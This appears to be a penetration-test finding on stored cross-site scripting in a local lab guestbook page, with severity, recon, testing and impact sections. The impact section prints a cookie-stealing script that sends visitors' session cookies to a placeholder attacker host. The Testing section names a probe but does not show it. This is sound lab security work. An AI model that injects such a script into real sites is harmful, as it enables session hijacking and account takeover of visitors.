# Finding 02 — Stored Cross-Site Scripting (XSS)

**Severity:** High  
**OWASP:** A03:2021 – Injection  
**URL:** http://localhost/vulnerabilities/xss_s/

## Description
The guestbook message field stores user input in the database and renders it as raw HTML without sanitization. Any JavaScript injected into the message field executes in the browser of every user who visits the page.

## Recon
The XSS (Stored) page contains two input fields: Name and Message. Both accept free text and display the content to all visitors permanently until the database is cleared.

## Testing
Submitted a standard XSS probe in the Message field:

## Exploit
The payload was stored in the database and executed on every page load. An alert box with "XSS" appeared immediately after submission and again on every subsequent visit to the page.

## Severity Reasoning
Rated High because the payload is persistent — it executes for every user who visits the page, not just the attacker. This enables large-scale session hijacking without requiring any further interaction from the attacker.

## Business Impact
An attacker can replace the alert payload with a cookie-stealing script:
```javascript
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>
```
This silently sends the session cookie of every visitor to an attacker-controlled server, enabling full account takeover at scale with no user interaction beyond visiting the page.

## Screenshot
See `/screenshots/SCREENSHOT #3.png`
